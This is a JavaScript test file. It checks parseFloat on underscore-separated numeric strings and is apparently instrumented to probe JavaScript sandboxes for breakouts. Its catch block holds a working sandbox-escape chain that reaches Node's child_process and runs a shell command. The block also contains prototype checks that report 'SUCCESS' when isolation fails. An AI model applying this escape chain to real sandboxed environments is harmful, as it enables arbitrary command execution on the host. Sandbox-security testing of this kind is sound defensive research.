try {
    assert.sameValue(parseFloat('1_0'), 1);
    assert.sameValue(parseFloat('1_1'), 1);
    assert.sameValue(parseFloat('1_2'), 1);
    assert.sameValue(parseFloat('1_3'), 1);
    assert.sameValue(parseFloat('1_4'), 1);
    assert.sameValue(parseFloat('1_5'), 1);
    assert.sameValue(parseFloat('1_6'), 1);
    assert.sameValue(parseFloat('1_7'), 1);
    assert.sameValue(parseFloat('1_8'), 1);
    assert.sameValue(parseFloat('1_9'), 1);
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}